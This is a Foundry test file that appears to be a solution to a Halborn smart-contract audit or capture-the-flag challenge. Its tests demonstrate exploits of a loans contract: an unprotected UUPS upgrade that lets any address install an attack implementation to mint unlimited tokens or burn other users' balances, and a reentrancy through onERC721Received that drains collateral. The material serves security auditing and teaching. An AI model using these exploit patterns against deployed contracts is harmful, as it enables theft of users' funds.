// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";
import {HalbornToken} from "../src/HalbornToken.sol";

import {HalbornLoans_UUPSattack} from "../src/exploit/HalbornLoansExploit.sol";

contract HalbornLoans_Test is Test {
    HalbornLoans public loans;
    ERC1967Proxy public loanProxy;
    HalbornLoans public loanImpl;

    HalbornToken public token;
    ERC1967Proxy tokenProxy;
    HalbornToken tokenImpl;

    HalbornNFT public nft;
    ERC1967Proxy nftProxy;
    HalbornNFT nftImpl;

    function setUp() public {
        tokenImpl = new HalbornToken();
        tokenProxy = new ERC1967Proxy(address(tokenImpl), "");
        token = HalbornToken(address(tokenProxy));
        token.initialize();

        nftImpl = new HalbornNFT();
        nftProxy = new ERC1967Proxy(address(nftImpl), "");
        nft = HalbornNFT(address(nftProxy));
        nft.initialize(keccak256(abi.encodePacked("root")), 1 ether);

        loanImpl = new HalbornLoans(0); // Assuming '0' is a placeholder and you'll replace it with the actual initial collateral price.
        bytes memory initData = abi.encodeWithSelector(HalbornLoans.initialize.selector, address(token), address(nft));
        loanProxy = new ERC1967Proxy(address(loanImpl), initData);
        loans = HalbornLoans(address(loanProxy));

        token.setLoans(address(loans));
    }

    // Critical Bug 1: Lack of access control in UUPS upgrade
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        loans.upgradeTo(address(attack));
        loans.initialize(address(1), address(1));
    }

    // Critical Bug 2: anyone can upgrade leading to infinite token minting
    function test_vulnerableLoanContractReksTokenMint() public {
        address alice = address(0x123);
        deal(address(token), alice, 1e6 * 1e18);

        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        loans.upgradeTo(address(attack));

        HalbornLoans_UUPSattack hackedLoans = HalbornLoans_UUPSattack(address(loanProxy));
        hackedLoans.initialize(address(token), address(nft));
        hackedLoans.mint();

        assertEq(token.balanceOf(address(this)), type(uint256).max);
    }

    // Critical Bug 3: anyone can upgrade leading to infinite token minting
    function test_vulnerableLoanContractReksTokenBurn() public {
        address alice = address(0x123);
        deal(address(token), alice, 1e6 * 1e18);

        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        loans.upgradeTo(address(attack));

        HalbornLoans_UUPSattack hackedLoans = HalbornLoans_UUPSattack(address(loanProxy));
        hackedLoans.initialize(address(token), address(nft));

        hackedLoans.burn(alice);
        assertEq(token.balanceOf(alice), 0);

        address sadDev = address(0x314);
        vm.startPrank(sadDev);
        HalbornLoans newLoan = new HalbornLoans(1e18);
        vm.expectRevert();
        hackedLoans.upgradeTo(address(newLoan));
    }

    // Critical Bug 4: reentrancy in withdraw allows infinite minting (no UUPS upgrade required)
    function test_Reentrancy() public {
        // get two NFTs as intended by design
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();

        assertEq(nft.balanceOf(address(this)), 2);

        nft.approve(address(loans), 1);
        nft.approve(address(loans), 2);
        loans.depositNFTCollateral(1);
        loans.depositNFTCollateral(2);

        // reentrancy attack
        startHack = true;
        loans.withdrawCollateral(1);

        assertEq(nft.ownerOf(1), address(this));
        assertEq(nft.ownerOf(2), address(this));

        assertEq(token.balanceOf(address(this)), type(uint256).max);
    }

    bool public startHack = false;

    function onERC721Received(address, /* operator */ address, /* from */ uint256 tokenId, bytes calldata /* data */ )
        external
        returns (bytes4)
    {
        if (startHack) {
            startHack = false;
            loans.withdrawCollateral(tokenId == 1 ? 2 : 1);
            if (tokenId == 1) {
                loans.getLoan(type(uint256).max);
            }
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
